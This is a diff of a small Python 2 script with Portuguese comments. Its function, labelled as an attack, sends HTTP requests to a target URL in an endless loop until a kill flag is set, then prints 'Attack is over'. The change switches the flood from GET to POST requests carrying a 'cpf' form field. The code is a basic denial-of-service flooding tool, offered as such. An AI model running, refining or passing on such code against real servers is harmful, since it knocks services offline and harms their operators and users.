@@ -13,10 +13,10 @@ Kill = False
 
 #Funcao ataque
 def Post(url,attackedServerPort):
-    parameters = {'dumb': 'dumb'}
+    parameters = {'cpf': '1234'}
     headers = {'keep_alive': 'True'}
     while not Kill:
-        r = requests.get(url,data = parameters, headers=headers)
+        r = requests.post(url, data=parameters, headers=headers)
         print r.text
 
     print 'Attack is over'
